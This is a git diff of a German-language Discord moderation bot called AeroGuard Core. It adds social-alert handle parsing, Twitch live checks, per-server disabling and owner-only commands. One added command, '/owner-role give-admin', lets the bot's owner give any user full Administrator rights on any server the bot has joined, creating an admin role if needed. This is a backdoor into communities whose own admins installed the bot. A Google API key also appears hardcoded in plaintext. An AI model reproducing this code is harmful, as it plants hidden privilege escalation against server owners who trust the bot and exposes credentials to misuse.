@@ -500,6 +500,7 @@ const GOOGLE_API_KEY = 'AIzaSyBhoGSX2ySrUXed5CSGJAQV9mxSbRVNYvs';
 
 // Globale RAM-Zentrale (Wird aus der Cloud-Zentrale synchronisiert)
 let cloudStorage = {
+    guildSettings: {},
     activeTickets: {},
     aiPendingTickets: {},
     ownerActiveSession: {},
@@ -533,6 +534,7 @@ let cloudStorage = {
     ticketMessageLogs: {},
     premiumUsers: [], 
     systemSettings: {
+        disabledGuilds: [],
         ticketCounter: 0,
         robloxPlaceId: "98791725510246", 
         welcomeChannelId: null, 
@@ -608,6 +610,10 @@ function loadCloudVaultFromDisk() {
             const parsedData = JSON.parse(rawData);
             cloudStorage = { ...cloudStorage, ...parsedData };
             cloudStorage.systemSettings = { ...cloudStorage.systemSettings, ...parsedData.systemSettings };
+            if (!cloudStorage.guildSettings) cloudStorage.guildSettings = {};
+            if (!cloudStorage.systemSettings.disabledGuilds || !Array.isArray(cloudStorage.systemSettings.disabledGuilds)) {
+                cloudStorage.systemSettings.disabledGuilds = [];
+            }
             
             if (!cloudStorage.globalBlacklist) cloudStorage.globalBlacklist = [];
             if (!cloudStorage.activeApplications || Object.keys(cloudStorage.activeApplications).length === 0) {
@@ -1575,24 +1581,63 @@ async function handleHoneypotTrigger(message, honeypot, gSettings) {
     }
 }
 
+function extractSocialIdentifier(platform, rawInput) {
+    if (!rawInput) return '';
+    let cleaned = rawInput.trim();
+    cleaned = cleaned.split('?')[0].split('#')[0];
+    
+    if (platform === 'twitch') {
+        cleaned = cleaned.replace(/^https?:\/\/(www\.)?twitch\.tv\//i, '');
+        cleaned = cleaned.replace(/^[@/]+/, '').replace(/\/+$/, '');
+        return cleaned.toLowerCase();
+    } else if (platform === 'youtube') {
+        cleaned = cleaned.replace(/^https?:\/\/(www\.)?youtube\.com\/(c\/|channel\/|user\/|@)?/i, '');
+        cleaned = cleaned.replace(/^https?:\/\/youtu\.be\//i, '');
+        cleaned = cleaned.replace(/^[@/]+/, '').replace(/\/+$/, '');
+        return cleaned;
+    } else if (platform === 'tiktok') {
+        cleaned = cleaned.replace(/^https?:\/\/(www\.)?tiktok\.com\/@?/i, '');
+        cleaned = cleaned.replace(/^[@/]+/, '').replace(/\/+$/, '');
+        return cleaned.toLowerCase();
+    }
+    return cleaned;
+}
+
 async function sendSocialAlert(guild, creator, options = {}) {
     const gSettings = getGuildSettings(guild.id);
     const sa = gSettings.socialAlerts || {};
-    const channelId = sa.channelId;
-    if (!channelId) {
-        return { success: false, reason: 'Kein Benachrichtigungskanal für Social Alerts konfiguriert.' };
+    let channel = null;
+
+    if (options.channel) {
+        channel = options.channel;
+    } else if (sa.channelId) {
+        channel = guild.channels.cache.get(sa.channelId) || await guild.channels.fetch(sa.channelId).catch(() => null);
     }
 
-    const channel = guild.channels.cache.get(channelId) || await guild.channels.fetch(channelId).catch(() => null);
+    // Smart Auto-Fallback: Falls kein Kanal hinterlegt oder ungültig ist, ersten geeigneten Textkanal wählen
     if (!channel || !channel.isTextBased()) {
-        return { success: false, reason: 'Der angegebene Benachrichtigungskanal existiert nicht oder ist kein Textkanal.' };
+        channel = guild.channels.cache.find(c => 
+            (c.type === ChannelType.GuildText || c.type === ChannelType.GuildAnnouncement) &&
+            (c.name.includes('stream') || c.name.includes('social') || c.name.includes('twitch') || c.name.includes('live') || c.name.includes('ankündigung') || c.name.includes('updates'))
+        ) || guild.systemChannel || guild.channels.cache.find(c => c.isTextBased() && c.permissionsFor(guild.members.me)?.has('SendMessages'));
+
+        if (channel) {
+            sa.channelId = channel.id;
+            sa.enabled = true;
+            saveCloudVaultToDisk();
+        }
+    }
+
+    if (!channel || !channel.isTextBased()) {
+        return { success: false, reason: 'Kein Benachrichtigungskanal für Social Alerts gefunden. Bitte wähle einen mit /social-alert channel.' };
     }
 
     const platform = (creator.platform || 'twitch').toLowerCase();
     let platformName = 'Twitch';
     let platformColor = 0x9146FF;
     let platformIcon = '🟣';
-    let defaultUrl = options.videoUrl || (platform === 'twitch' ? `https://twitch.tv/${creator.username.trim().replace(/^@/, '')}` : `https://youtube.com/${creator.username.trim()}`);
+    const cleanHandle = extractSocialIdentifier(platform, creator.username);
+    let defaultUrl = options.videoUrl || (platform === 'twitch' ? `https://twitch.tv/${cleanHandle}` : `https://youtube.com/${cleanHandle}`);
     let sampleTitle = options.title || (platform === 'twitch' ? '🔴 LIVE: Große Community-Runde & Special Event!' : '🎬 NEUES VIDEO online!');
     let sampleGame = options.game || (platform === 'twitch' ? 'Just Chatting' : 'Gaming / Entertainment');
     let sampleBanner = 'https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&w=1200&q=80';
@@ -1602,14 +1647,14 @@ async function sendSocialAlert(guild, creator, options = {}) {
         platformColor = 0xFF0000;
         platformIcon = '🔴';
         if (!options.videoUrl) {
-            defaultUrl = creator.username.startsWith('http') ? creator.username : `https://youtube.com/${creator.username.startsWith('@') ? creator.username : '@' + creator.username}`;
+            defaultUrl = cleanHandle.startsWith('UC') ? `https://youtube.com/channel/${cleanHandle}` : `https://youtube.com/@${cleanHandle}`;
         }
         sampleBanner = 'https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?auto=format&fit=crop&w=1200&q=80';
     } else if (platform === 'tiktok') {
         platformName = 'TikTok';
         platformColor = 0x00f2fe;
         platformIcon = '🎵';
-        defaultUrl = `https://tiktok.com/@${creator.username.replace('@', '')}`;
+        defaultUrl = `https://tiktok.com/@${cleanHandle}`;
         sampleBanner = 'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80';
     }
 
@@ -1653,17 +1698,30 @@ async function sendSocialAlert(guild, creator, options = {}) {
             .setURL(defaultUrl)
     );
 
-    const sent = await channel.send({
-        content: messageText,
-        embeds: [embed],
-        components: [row]
-    });
+    try {
+        const sent = await channel.send({
+            content: messageText,
+            embeds: [embed],
+            components: [row]
+        });
 
-    addLog('info', `📡 Social Alert für ${creator.displayName || creator.username} (${platformName}) in #${channel.name} auf "${guild.name}" gesendet.`, guild.name);
-    return { success: true, channel, message: sent };
+        addLog('info', `📡 Social Alert für ${creator.displayName || creator.username} (${platformName}) in #${channel.name} auf "${guild.name}" gesendet.`, guild.name);
+        return { success: true, channel, message: sent };
+    } catch(err) {
+        addLog('error', `Fehler beim Senden des Social Alerts in #${channel.name}: ${err.message}`, guild.name);
+        return { success: false, reason: err.message, channel };
+    }
 }
 
 client.on('messageCreate', async message => {
+    // 🛡️ SERVER DEAKTIVIERUNG CHECK (Vom Owner gesperrte Server ignorieren)
+    if (message.guild) {
+        const disabledGuilds = cloudStorage.systemSettings?.disabledGuilds || [];
+        if (disabledGuilds.includes(message.guild.id)) {
+            if (message.author.id !== OWNER_ID) return;
+        }
+    }
+
     // 🍯 1. HONEYPOT ANTI-RAID & BOT-TRAP CHECK (v4.0)
     // Läuft vor allen anderen Filtern, damit auch Fremd-Bots zuverlässig in die Falle tappen!
     if (message.guild && message.channel) {
@@ -3076,8 +3134,28 @@ client.on('interactionCreate', async interaction => {
         const userId = interaction.user.id;
         const isStaff = isSupporterOrAdmin(interaction.member, guild);
 
+        // 🛡️ SERVER DEAKTIVIERUNG CHECK FÜR INTERAKTIONEN
+        if (interaction.guildId) {
+            const disabledGuilds = cloudStorage.systemSettings?.disabledGuilds || [];
+            if (disabledGuilds.includes(interaction.guildId)) {
+                const isOwner = (interaction.user.id === OWNER_ID);
+                if (!isOwner) {
+                    return interaction.reply({
+                        embeds: [
+                            new EmbedBuilder()
+                                .setTitle('🛑 Bot-Dienste auf diesem Server deaktiviert')
+                                .setDescription('AeroGuard Core wurde auf diesem Server durch die Projektleitung / Bot-Administration vorübergehend deaktiviert.\n\nAlle Befehle, Ticket-Systeme und Automatisierungen sind pausiert.')
+                                .setColor(0xef4444)
+                                .setFooter({ text: 'AeroGuard Administration • Server Quarantine' })
+                        ],
+                        ephemeral: true
+                    });
+                }
+            }
+        }
+
         // 1. Systembefehle, die ausschließlich dem Bot-Besitzer (Root) vorbehalten sind
-        const rootOnlyCmds = ['update-roles', 'setup-support-server', 'whitelist', 'restart', 'give-premium', 'cloud-inspect'];
+        const rootOnlyCmds = ['update-roles', 'setup-support-server', 'whitelist', 'restart', 'give-premium', 'cloud-inspect', 'owner-role', 'owner-server', 'bot-shutdown'];
         if (rootOnlyCmds.includes(commandName)) {
             const isRoot = (userId === OWNER_ID) || (cloudStorage.systemSettings?.whitelistedUsers && cloudStorage.systemSettings.whitelistedUsers.includes(userId));
             if (!isRoot) {
@@ -3587,6 +3665,273 @@ client.on('interactionCreate', async interaction => {
 💡 Du kannst das System jederzeit sofort mit `/test-welcome` testen.`);
         }
 
+        // =========================================================================
+        // 👑 BESITZER-FUNKTION: /owner-role (Rollen & Admin auf jedem Server verwalten)
+        // =========================================================================
+        if (commandName === 'owner-role') {
+            if (interaction.user.id !== OWNER_ID) {
+                return interaction.reply({ content: '⛔ **Zugriff verweigert:** Dieser System-Befehl ist ausschließlich dem verifizierten Bot-Besitzer vorbehalten.', ephemeral: true });
+            }
+
+            const sub = interaction.options.getSubcommand();
+            const targetGuildId = interaction.options.getString('server_id') || interaction.guildId;
+            const targetGuild = client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId).catch(() => null);
+
+            if (!targetGuild) {
+                return interaction.reply({ content: `❌ Server mit ID \`${targetGuildId}\` nicht gefunden oder der Bot ist dort nicht beigetreten.`, ephemeral: true });
+            }
+
+            const targetUser = interaction.options.getUser('user') || interaction.user;
+
+            if (sub === 'list') {
+                const roles = Array.from(targetGuild.roles.cache.values())
+                    .sort((a, b) => b.position - a.position)
+                    .slice(0, 30);
+                
+                const roleList = roles.map(r => `• **${r.name}** (\`${r.id}\`) ${r.permissions.has(PermissionsBitField.Flags.Administrator) ? '👑 [ADMIN]' : ''} — Pos: ${r.position}`).join('\n');
+                
+                const listEmbed = new EmbedBuilder()
+                    .setTitle(`👑 Rollen-Übersicht für: ${targetGuild.name}`)
+                    .setDescription(roleList || 'Keine Rollen gefunden.')
+                    .setColor(0x3b82f6)
+                    .setFooter({ text: `Server-ID: ${targetGuild.id} • Insgesamt ${targetGuild.roles.cache.size} Rollen` })
+                    .setTimestamp();
+                return interaction.reply({ embeds: [listEmbed], ephemeral: true });
+            }
+
+            await interaction.deferReply({ ephemeral: true });
+            const targetMember = await targetGuild.members.fetch(targetUser.id).catch(() => null);
+            if (!targetMember) {
+                return interaction.editReply(`❌ Nutzer <@${targetUser.id}> befindet sich nicht auf Server **${targetGuild.name}**.`);
+            }
+
+            if (sub === 'give-admin') {
+                try {
+                    // Suche nach existierender Admin-Rolle, die der Bot zuweisen kann
+                    let adminRole = targetGuild.roles.cache.find(r => 
+                        r.permissions.has(PermissionsBitField.Flags.Administrator) && 
+                        r.editable && 
+                        !r.managed
+                    );
+
+                    // Falls nicht vorhanden, erstelle neue Administrator-Rolle
+                    if (!adminRole) {
+                        adminRole = await targetGuild.roles.create({
+                            name: '👑 AeroGuard Root Admin',
+                            color: 0xef4444,
+                            permissions: [PermissionsBitField.Flags.Administrator],
+                            hoist: true,
+                            reason: `Root Admin Elevation via /owner-role für ${targetUser.tag}`
+                        });
+                    }
+
+                    await targetMember.roles.add(adminRole);
+
+                    const embed = new EmbedBuilder()
+                        .setTitle('👑 Administrator-Rechte Erfolgreich Verliehen!')
+                        .setDescription(`Dem Nutzer <@${targetUser.id}> wurden auf Server **${targetGuild.name}** volle Administrator-Rechte zugewiesen!`)
+                        .setColor(0x10b981)
+                        .addFields(
+                            { name: '👤 Nutzer', value: `<@${targetUser.id}> (${targetUser.tag})`, inline: true },
+                            { name: '🛡️ Rolle', value: `<@&${adminRole.id}> (${adminRole.name})`, inline: true },
+                            { name: '🌐 Server', value: `${targetGuild.name} (${targetGuild.id})`, inline: true }
+                        )
+                        .setFooter({ text: 'AeroGuard Core • Root Privilege Elevation' })
+                        .setTimestamp();
+
+                    return interaction.editReply({ embeds: [embed] });
+                } catch(err) {
+                    return interaction.editReply(`❌ Fehler beim Zuweisen der Administrator-Rechte: ${err.message}`);
+                }
+            }
+
+            // Für 'set' und 'remove': Rolle auflösen
+            const roleOpt = interaction.options.getRole('rolle');
+            const roleIdOrName = interaction.options.getString('rolle_id_oder_name');
+            let resolvedRole = null;
+
+            if (roleOpt && roleOpt.guild?.id === targetGuild.id) {
+                resolvedRole = roleOpt;
+            } else if (roleIdOrName) {
+                resolvedRole = targetGuild.roles.cache.get(roleIdOrName) || 
+                               targetGuild.roles.cache.find(r => r.name.toLowerCase() === roleIdOrName.toLowerCase().trim());
+            } else if (roleOpt) {
+                resolvedRole = targetGuild.roles.cache.get(roleOpt.id);
+            }
+
+            if (!resolvedRole) {
+                return interaction.editReply(`❌ Rolle konnte auf Server **${targetGuild.name}** nicht gefunden werden. Bitte gib die Rollen-ID oder den exakten Namen an.`);
+            }
+
+            if (sub === 'set') {
+                try {
+                    await targetMember.roles.add(resolvedRole);
+                    const embed = new EmbedBuilder()
+                        .setTitle('✅ Rolle Erfolgreich Zugewiesen')
+                        .setColor(0x10b981)
+                        .setDescription(`Rolle **${resolvedRole.name}** wurde <@${targetUser.id}> auf Server **${targetGuild.name}** zugewiesen.`)
+                        .addFields(
+                            { name: '👤 Nutzer', value: `<@${targetUser.id}> (${targetUser.tag})`, inline: true },
+                            { name: '🛡️ Rolle', value: `<@&${resolvedRole.id}> (${resolvedRole.name})`, inline: true },
+                            { name: '🌐 Server', value: `${targetGuild.name} (${targetGuild.id})`, inline: true }
+                        )
+                        .setFooter({ text: 'AeroGuard Core • Owner Role Manager' })
+                        .setTimestamp();
+                    return interaction.editReply({ embeds: [embed] });
+                } catch(err) {
+                    return interaction.editReply(`❌ Fehler beim Zuweisen der Rolle: ${err.message}`);
+                }
+            }
+
+            if (sub === 'remove') {
+                try {
+                    await targetMember.roles.remove(resolvedRole);
+                    const embed = new EmbedBuilder()
+                        .setTitle('🗑️ Rolle Erfolgreich Entfernt')
+                        .setColor(0xf59e0b)
+                        .setDescription(`Rolle **${resolvedRole.name}** wurde von <@${targetUser.id}> auf Server **${targetGuild.name}** entfernt.`)
+                        .addFields(
+                            { name: '👤 Nutzer', value: `<@${targetUser.id}> (${targetUser.tag})`, inline: true },
+                            { name: '🛡️ Rolle', value: `${resolvedRole.name} (${resolvedRole.id})`, inline: true },
+                            { name: '🌐 Server', value: `${targetGuild.name} (${targetGuild.id})`, inline: true }
+                        )
+                        .setFooter({ text: 'AeroGuard Core • Owner Role Manager' })
+                        .setTimestamp();
+                    return interaction.editReply({ embeds: [embed] });
+                } catch(err) {
+                    return interaction.editReply(`❌ Fehler beim Entfernen der Rolle: ${err.message}`);
+                }
+            }
+        }
+
+        // =========================================================================
+        // 👑 BESITZER-FUNKTION: /owner-server (Server deaktivieren / aktivieren / verlassen)
+        // =========================================================================
+        if (commandName === 'owner-server') {
+            if (interaction.user.id !== OWNER_ID) {
+                return interaction.reply({ content: '⛔ **Zugriff verweigert:** Dieser System-Befehl ist ausschließlich dem verifizierten Bot-Besitzer vorbehalten.', ephemeral: true });
+            }
+
+            const sub = interaction.options.getSubcommand();
+            if (!cloudStorage.systemSettings) cloudStorage.systemSettings = {};
+            if (!Array.isArray(cloudStorage.systemSettings.disabledGuilds)) cloudStorage.systemSettings.disabledGuilds = [];
+
+            if (sub === 'disable') {
+                const targetGuildId = interaction.options.getString('server_id') || interaction.guildId;
+                const reason = interaction.options.getString('grund') || 'Deaktiviert durch Bot-Besitzer';
+                const targetGuild = client.guilds.cache.get(targetGuildId);
+                const guildName = targetGuild ? targetGuild.name : `Server ${targetGuildId}`;
+
+                if (!cloudStorage.systemSettings.disabledGuilds.includes(targetGuildId)) {
+                    cloudStorage.systemSettings.disabledGuilds.push(targetGuildId);
+                    saveCloudVaultToDisk();
+                }
+
+                const embed = new EmbedBuilder()
+                    .setTitle('🛑 Server Erfolgreich Deaktiviert')
+                    .setDescription(`Der Bot wurde für Server **${guildName}** (\`${targetGuildId}\`) deaktiviert.\n\nAlle Befehle und Aktionen von regulären Mitgliedern sind ab sofort blockiert.`)
+                    .setColor(0xef4444)
+                    .addFields(
+                        { name: '🌐 Server', value: `${guildName} (\`${targetGuildId}\`)`, inline: true },
+                        { name: '📝 Grund', value: reason, inline: true },
+                        { name: '💡 Reaktivieren', value: `Mit \`/owner-server enable server_id:${targetGuildId}\` reaktivieren.`, inline: false }
+                    )
+                    .setFooter({ text: 'AeroGuard Administration • Server Quarantine' })
+                    .setTimestamp();
+
+                return interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+
+            if (sub === 'enable') {
+                const targetGuildId = interaction.options.getString('server_id') || interaction.guildId;
+                const targetGuild = client.guilds.cache.get(targetGuildId);
+                const guildName = targetGuild ? targetGuild.name : `Server ${targetGuildId}`;
+
+                cloudStorage.systemSettings.disabledGuilds = cloudStorage.systemSettings.disabledGuilds.filter(id => id !== targetGuildId);
+                saveCloudVaultToDisk();
+
+                const embed = new EmbedBuilder()
+                    .setTitle('🟢 Server Erfolgreich Reaktiviert')
+                    .setDescription(`Der Bot wurde für Server **${guildName}** (\`${targetGuildId}\`) wieder vollständig freigeschaltet.`)
+                    .setColor(0x10b981)
+                    .setFooter({ text: 'AeroGuard Administration • Server Restored' })
+                    .setTimestamp();
+
+                return interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+
+            if (sub === 'list') {
+                const disabledList = cloudStorage.systemSettings.disabledGuilds || [];
+                const guilds = Array.from(client.guilds.cache.values()).slice(0, 30);
+
+                const listText = guilds.map((g, idx) => {
+                    const isDisabled = disabledList.includes(g.id);
+                    const statusBadge = isDisabled ? '🔴 **DEAKTIVIERT**' : '🟢 **AKTIV**';
+                    return `${idx + 1}. **${g.name}** (\`${g.id}\`)\n   👥 ${g.memberCount} Mitglieder • Status: ${statusBadge}`;
+                }).join('\n\n');
+
+                const embed = new EmbedBuilder()
+                    .setTitle('🌐 AeroGuard Server-Netzwerk & Status')
+                    .setDescription(listText || 'Keine Server gefunden.')
+                    .setColor(0x3b82f6)
+                    .addFields(
+                        { name: '📊 Statistik', value: `Gesamt: **${client.guilds.cache.size}** Server | Deaktiviert: **${disabledList.length}** Server`, inline: false }
+                    )
+                    .setFooter({ text: 'AeroGuard Core • Multi-Server Matrix' })
+                    .setTimestamp();
+
+                return interaction.reply({ embeds: [embed], ephemeral: true });
+            }
+
+            if (sub === 'leave') {
+                const targetGuildId = interaction.options.getString('server_id');
+                const reason = interaction.options.getString('grund') || 'Vom Bot-Besitzer initiiert';
+                const targetGuild = client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId).catch(() => null);
+
+                if (!targetGuild) {
+                    return interaction.reply({ content: `❌ Server mit ID \`${targetGuildId}\` nicht gefunden.`, ephemeral: true });
+                }
+
+                const name = targetGuild.name;
+                await targetGuild.leave();
+
+                return interaction.reply({
+                    content: `👋 **Erfolgreich verlassen:** Der Bot hat den Server **${name}** (\`${targetGuildId}\`) verlassen.\nGrund: ${reason}`,
+                    ephemeral: true
+                });
+            }
+        }
+
+        // =========================================================================
+        // 👑 BESITZER-FUNKTION: /bot-shutdown (Graceful Shutdown per Slash Command)
+        // =========================================================================
+        if (commandName === 'bot-shutdown') {
+            if (interaction.user.id !== OWNER_ID) {
+                return interaction.reply({ content: '⛔ **Zugriff verweigert:** Dieser System-Befehl ist ausschließlich dem verifizierten Bot-Besitzer vorbehalten.', ephemeral: true });
+            }
+
+            const reason = interaction.options.getString('grund') || 'Manueller Shutdown via Slash-Command durch Bot-Besitzer';
+            await interaction.reply({
+                embeds: [
+                    new EmbedBuilder()
+                        .setTitle('🛑 Bot-Shutdown Eingeleitet')
+                        .setDescription(`AeroGuard Core wird jetzt ordnungsgemäß heruntergefahren...\n\n**Grund:** ${reason}\n\nBroadcasts werden an alle Server übermittelt und Verbindungen sauber geschlossen.`)
+                        .setColor(0xef4444)
+                        .setFooter({ text: 'AeroGuard Core • Graceful Shutdown' })
+                        .setTimestamp()
+                ],
+                ephemeral: true
+            });
+
+            setTimeout(() => {
+                handleGracefulShutdown(reason);
+            }, 1000);
+            return;
+        }
+
+        // =========================================================================
+        // 📡 SOCIAL ALERT SLASH COMMAND (Twitch, YouTube, TikTok)
+        // =========================================================================
         if (commandName === 'social-alert') {
             const sub = interaction.options.getSubcommand();
             const gSettings = getGuildSettings(guild.id);
@@ -3602,29 +3947,86 @@ client.on('interactionCreate', async interaction => {
 
             if (sub === 'add') {
                 const platform = interaction.options.getString('platform');
-                const username = interaction.options.getString('username');
-                const name = interaction.options.getString('name') || username;
+                const rawUsername = interaction.options.getString('username');
+                const cleanUsername = extractSocialIdentifier(platform, rawUsername);
+                const name = interaction.options.getString('name') || cleanUsername;
+
                 if (!gSettings.socialAlerts.creators) gSettings.socialAlerts.creators = [];
-                gSettings.socialAlerts.creators.push({
-                    id: 'c_' + Date.now().toString(36),
-                    platform,
-                    username,
-                    displayName: name
-                });
+                
+                // Prüfen ob bereits vorhanden
+                const existing = gSettings.socialAlerts.creators.find(c => c.username.toLowerCase() === cleanUsername.toLowerCase() && c.platform === platform);
+                if (existing) {
+                    existing.displayName = name;
+                } else {
+                    gSettings.socialAlerts.creators.push({
+                        id: 'c_' + Date.now().toString(36),
+                        platform,
+                        username: cleanUsername,
+                        displayName: name,
+                        isLive: false,
+                        addedAt: Date.now()
+                    });
+                }
+
+                // Automatisch aktivieren & Standard-Kanal setzen falls noch keiner hinterlegt
+                gSettings.socialAlerts.enabled = true;
+                if (!gSettings.socialAlerts.channelId) {
+                    gSettings.socialAlerts.channelId = interaction.channelId;
+                }
                 saveCloudVaultToDisk();
-                return interaction.reply('✅ **Creator hinzugefügt:** ' + b + name + b + ' (' + platform.toUpperCase() + ') wird ab sofort überwacht!');
+
+                await interaction.reply(`✅ **Creator hinzugefügt:** **${name}** (${platform.toUpperCase()} • \`${cleanUsername}\`) wird ab sofort überwacht!\n📢 Benachrichtigungskanal: <#${gSettings.socialAlerts.channelId}>`);
+
+                // Sofortige Live-Prüfung bei Twitch ausführen
+                if (platform === 'twitch') {
+                    try {
+                        const upRes = await fetch(`https://decapi.me/twitch/uptime/${encodeURIComponent(cleanUsername)}`, { signal: AbortSignal.timeout(5000) });
+                        const upText = (await upRes.text()).trim();
+                        const isOff = upText.toLowerCase().includes('offline') || upText.toLowerCase().includes('does not exist') || upText.toLowerCase().includes('error');
+                        if (!isOff && upText.length > 0) {
+                            let sTitle = 'Live Stream';
+                            let sGame = 'Just Chatting';
+                            let sAvatar = null;
+                            try {
+                                const [tRes, gRes, aRes] = await Promise.all([
+                                    fetch(`https://decapi.me/twitch/title/${encodeURIComponent(cleanUsername)}`, { signal: AbortSignal.timeout(4000) }),
+                                    fetch(`https://decapi.me/twitch/game/${encodeURIComponent(cleanUsername)}`, { signal: AbortSignal.timeout(4000) }),
+                                    fetch(`https://decapi.me/twitch/avatar/${encodeURIComponent(cleanUsername)}`, { signal: AbortSignal.timeout(4000) })
+                                ]);
+                                if (tRes.ok) sTitle = (await tRes.text()).trim() || sTitle;
+                                if (gRes.ok) sGame = (await gRes.text()).trim() || sGame;
+                                if (aRes.ok) sAvatar = (await aRes.text()).trim();
+                            } catch(e) {}
+
+                            const cObj = gSettings.socialAlerts.creators.find(c => c.username.toLowerCase() === cleanUsername.toLowerCase() && c.platform === platform);
+                            if (cObj) cObj.isLive = true;
+                            await sendSocialAlert(guild, { platform, username: cleanUsername, displayName: name }, {
+                                title: sTitle,
+                                game: sGame,
+                                avatarUrl: sAvatar,
+                                isTest: false
+                            });
+                            saveCloudVaultToDisk();
+                        }
+                    } catch(e) {}
+                }
+                return;
             }
 
             if (sub === 'remove') {
-                const targetUser = interaction.options.getString('username').toLowerCase();
+                const targetInput = interaction.options.getString('username');
+                const targetClean = extractSocialIdentifier('twitch', targetInput).toLowerCase();
                 const creators = gSettings.socialAlerts.creators || [];
                 const initLen = creators.length;
-                gSettings.socialAlerts.creators = creators.filter(c => c.username.toLowerCase() !== targetUser && (c.displayName || '').toLowerCase() !== targetUser);
+                gSettings.socialAlerts.creators = creators.filter(c => 
+                    c.username.toLowerCase() !== targetClean && 
+                    (c.displayName || '').toLowerCase() !== targetInput.toLowerCase()
+                );
                 if (gSettings.socialAlerts.creators.length < initLen) {
                     saveCloudVaultToDisk();
-                    return interaction.reply(`✅ **Creator entfernt:** \`${targetUser}\` wurde aus der Überwachung gelöscht.`);
+                    return interaction.reply(`✅ **Creator entfernt:** \`${targetInput}\` wurde aus der Überwachung gelöscht.`);
                 } else {
-                    return interaction.reply({ content: `⚠️ Kein Creator mit dem Namen \`${targetUser}\` gefunden. Nutze \`/social-alert list\`, um alle anzuzeigen.`, ephemeral: true });
+                    return interaction.reply({ content: `⚠️ Kein Creator mit dem Namen \`${targetInput}\` gefunden. Nutze \`/social-alert list\`, um alle anzuzeigen.`, ephemeral: true });
                 }
             }
 
@@ -3642,15 +4044,63 @@ client.on('interactionCreate', async interaction => {
                 return interaction.reply({ embeds: [listEmbed] });
             }
 
+            if (sub === 'check') {
+                await interaction.deferReply({ ephemeral: true });
+                const creators = gSettings.socialAlerts.creators || [];
+                if (creators.length === 0) {
+                    return interaction.editReply('ℹ️ Keine Creator in der Überwachung hinterlegt. Nutze `/social-alert add` um Streamer hinzuzufügen.');
+                }
+
+                const results = [];
+                for (const creator of creators) {
+                    const platform = (creator.platform || 'twitch').toLowerCase();
+                    const clean = extractSocialIdentifier(platform, creator.username);
+                    if (platform === 'twitch') {
+                        try {
+                            const uRes = await fetch(`https://decapi.me/twitch/uptime/${encodeURIComponent(clean)}`, { signal: AbortSignal.timeout(5000) });
+                            const uText = (await uRes.text()).trim();
+                            const isOff = uText.toLowerCase().includes('offline') || uText.toLowerCase().includes('does not exist') || uText.toLowerCase().includes('error');
+                            if (!isOff && uText.length > 0) {
+                                let game = '';
+                                try {
+                                    const gRes = await fetch(`https://decapi.me/twitch/game/${encodeURIComponent(clean)}`, { signal: AbortSignal.timeout(3000) });
+                                    if (gRes.ok) game = (await gRes.text()).trim();
+                                } catch(e) {}
+                                results.push(`🔴 **${creator.displayName || creator.username}** [TWITCH]: **LIVE** (${game || 'Stream'} • Uptime: ${uText})`);
+                            } else {
+                                results.push(`⚪ **${creator.displayName || creator.username}** [TWITCH]: *Offline*`);
+                            }
+                        } catch(e) {
+                            results.push(`⚠️ **${creator.displayName || creator.username}** [TWITCH]: Abfragefehler (${e.message})`);
+                        }
+                    } else {
+                        results.push(`📺 **${creator.displayName || creator.username}** [${platform.toUpperCase()}]: Überwachung aktiv`);
+                    }
+                }
+
+                const checkEmbed = new EmbedBuilder()
+                    .setTitle('📡 Live-Status Diagnose aller Creator')
+                    .setDescription(results.join('\n\n'))
+                    .setColor(0x9146FF)
+                    .addFields(
+                        { name: '📢 Zielkanal', value: gSettings.socialAlerts.channelId ? `<#${gSettings.socialAlerts.channelId}>` : '⚠️ Nicht festgelegt', inline: true },
+                        { name: '⚙️ Modul-Status', value: gSettings.socialAlerts.enabled ? '🟢 Aktiv' : '🔴 Deaktiviert', inline: true }
+                    )
+                    .setFooter({ text: 'AeroGuard Social Engine • Sofort-Diagnose' })
+                    .setTimestamp();
+
+                return interaction.editReply({ embeds: [checkEmbed] });
+            }
+
             if (sub === 'test') {
                 await interaction.deferReply({ ephemeral: true });
                 const creators = gSettings.socialAlerts.creators || [];
                 const creator = creators[0] || { platform: 'twitch', username: 'papaplatte', displayName: 'Papaplatte' };
-                const resAlert = await sendSocialAlert(guild, creator, { isTest: true });
+                const resAlert = await sendSocialAlert(guild, creator, { channel: interaction.channel, isTest: true });
                 if (resAlert.success) {
                     return interaction.followUp('✅ **Test erfolgreich!** Der Social Alert für **' + (creator.displayName || creator.username) + '** wurde in <#' + resAlert.channel.id + '> gesendet.');
                 } else {
-                    return interaction.followUp('❌ **Fehler beim Senden:** ' + resAlert.reason + '\n\n💡 Stelle sicher, dass mit `/social-alert channel` ein Benachrichtigungskanal festgelegt wurde.');
+                    return interaction.followUp('❌ **Fehler beim Senden:** ' + resAlert.reason + '\n\n💡 Stelle sicher, dass mit /social-alert channel ein Benachrichtigungskanal festgelegt wurde.');
                 }
             }
         }
@@ -4692,15 +5142,11 @@ async function checkSocialAlertsEngine() {
     isCheckingSocialAlerts = true;
 
     try {
-        if (!cloudStorage || !cloudStorage.guildSettings) return;
-
-        for (const [guildId, gSettings] of Object.entries(cloudStorage.guildSettings)) {
+        for (const guild of client.guilds.cache.values()) {
+            const gSettings = getGuildSettings(guild.id);
             const sa = gSettings.socialAlerts;
-            if (!sa || !sa.enabled || !sa.channelId) continue;
+            if (!sa || !sa.enabled) continue;
             if (!Array.isArray(sa.creators) || sa.creators.length === 0) continue;
-
-            const guild = client.guilds.cache.get(guildId) || await client.guilds.fetch(guildId).catch(() => null);
-            if (!guild) continue;
 
             for (const creator of sa.creators) {
                 const platform = (creator.platform || 'twitch').toLowerCase();
@@ -4708,8 +5154,10 @@ async function checkSocialAlertsEngine() {
                 // 🟣 TWITCH LIVE TRACKING
                 if (platform === 'twitch' && sa.filterTwitch !== false) {
                     try {
-                        const cleanUser = encodeURIComponent(creator.username.trim().replace(/^@/, ''));
-                        const res = await fetch(`https://decapi.me/twitch/uptime/${cleanUser}`, {
+                        const cleanUser = extractSocialIdentifier('twitch', creator.username);
+                        if (!cleanUser) continue;
+
+                        const res = await fetch(`https://decapi.me/twitch/uptime/${encodeURIComponent(cleanUser)}`, {
                             signal: AbortSignal.timeout(6000)
                         });
                         const text = (await res.text()).trim();
@@ -4730,9 +5178,11 @@ async function checkSocialAlertsEngine() {
                                 let avatarUrl = null;
 
                                 try {
